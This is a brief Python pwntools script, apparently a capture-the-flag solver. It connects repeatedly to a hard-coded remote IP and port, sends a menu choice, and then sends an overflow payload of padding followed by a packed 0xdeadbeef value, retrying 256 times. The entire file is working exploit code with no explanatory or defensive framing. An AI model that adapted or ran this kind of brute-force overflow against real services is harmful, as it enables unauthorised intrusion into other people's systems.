from pwn import *
from time import sleep

context.terminal = ['tmux', 'splitw', '-h']

for i in range(256):
    #  r = process('./250.bin')
    #  gdb.attach(r, '''
    #  c
    #  ''')
    r = remote('45.32.157.65', 65023)

    sleep(0.1)
    print r.recv()
    r.sendline('C')
    sleep(0.1)
    print r.recv()
    r.sendline('A'*16 + p64(0xdeadbeef) + '\x00')
    sleep(0.2)
    try:
        print r.recv()
    except:
        print 'fail'

    r.close()
